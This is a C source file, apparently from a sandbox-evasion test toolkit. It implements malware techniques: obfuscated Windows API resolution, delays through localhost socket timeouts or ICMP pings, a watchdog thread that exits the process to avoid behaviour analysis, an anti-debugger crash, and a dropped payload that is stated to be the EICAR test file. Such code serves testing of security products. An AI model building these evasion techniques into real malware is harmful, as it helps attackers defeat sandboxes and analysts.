#include "xEvade01.h"

#include <stdint.h>
#include <wchar.h>
#include <Windows.h>

#include "xLibMaliciousApi.h"
#include "xOsApi.h"

#include "xPayloadManager.h"
#include "xUtility.h"



// Malware file name
#define X_MALWARE_FILE_NAME X_OBFUSCATED_STRING_W(L"sandworm-payload.file")

// Thread startup sync
static CRITICAL_SECTION g_sync;

// Continue evasion loop if no evasion required
static bool g_doingEvil = false;



// Evasion thread proc
static DWORD WINAPI EvasionProc(LPVOID)
{
	// This thread tries to prevent sandbox analysis
	srand((uint32_t) X_KERNEL32_CALL(GetTickCount)());

	// Release ownership and cause evil thread to start
	X_KERNEL32_CALL(LeaveCriticalSection)(&g_sync);

	// Wait for a randomized time which sleeps ~10 min
	do
	{
		X_KERNEL32_CALL(Sleep)(15 * 60 * 1000 + (uint16_t) rand());
	}
	while (g_doingEvil);

	// If wait returns the process exits, thus evading behavior analysis of the evil thread 
	X_KERNEL32_CALL(ExitProcess)(0);

	return 0;
}

static DWORD WINAPI EvilProc(LPVOID)
{
	// Release ownership
	X_KERNEL32_CALL(LeaveCriticalSection)(&g_sync);

	const DWORD now = X_KERNEL32_CALL(GetTickCount)();

	// Fuzz evasion method, either localhost socket timeouts or pings
	switch (X_RANDOM_NUMBER(0, 1))
	{
		case 0:
		{
			for (uint32_t i = 0; i < 15; i++)
			{
				X_LIB_MALICIOUS_CALL(xDelayInternalNetwork)();
			}

			break;
		}
		case 1:
		{
			for (uint32_t i = 0; i < 500; i++)
			{
				X_LIB_MALICIOUS_CALL(xDelayIcmp)();
			}

			break;
		}
		default:
		{
			// ?
		}
	}

	const DWORD elapsed = X_KERNEL32_CALL(GetTickCount)() - now;

	g_doingEvil = true;

	// Do evil. We do this by checking if a debugger is present and also by writing the Eicar test file. Please replace with whatever you think is evil ;-)
	X_LIB_MALICIOUS_CALL(xCrashIfDebugger)();

	xPayloadManagerDrop(X_MALWARE_FILE_NAME);

	g_doingEvil = false;

	return 0;
}

void xEvade01(int argc, wchar_t* argv[])
{
	xPrint(L"Original: 0x%08x", CreateFileW);
	xPrint(L"Hidden: 0x%08x", xGetOsApi().GetKernel32().GetFunction(X_OBFUSCATED_STRING_A("CreateFileW")));

	X_KERNEL32_CALL(InitializeCriticalSection)(&g_sync);

	// Acquire access and start evasion thread
	X_KERNEL32_CALL(EnterCriticalSection)(&g_sync);

	HANDLE evasionThread = X_KERNEL32_CALL(CreateThread)(NULL, 0, EvasionProc, NULL, 0, NULL);

	X_KERNEL32_CALL(SetThreadPriority)(evasionThread, THREAD_PRIORITY_TIME_CRITICAL);

	X_KERNEL32_CALL(CloseHandle)(evasionThread);

	// Wait for access and start evil thread
	X_KERNEL32_CALL(EnterCriticalSection)(&g_sync);

	HANDLE evilThread = X_KERNEL32_CALL(CreateThread)(NULL, 0, EvilProc, NULL, CREATE_SUSPENDED, NULL);

	// Pre-evasion
	for (uint32_t ui = 0; ui < 10; ui++)
	{
		X_KERNEL32_CALL(Sleep)(100);
	}

	X_KERNEL32_CALL(SetThreadPriority)(evilThread, THREAD_PRIORITY_LOWEST);

	X_KERNEL32_CALL(ResumeThread)(evilThread);

	X_KERNEL32_CALL(Sleep)(0);

	X_KERNEL32_CALL(WaitForSingleObject)(evilThread, INFINITE);

	X_KERNEL32_CALL(DeleteCriticalSection)(&g_sync);

	X_KERNEL32_CALL(CloseHandle)(evilThread);
}
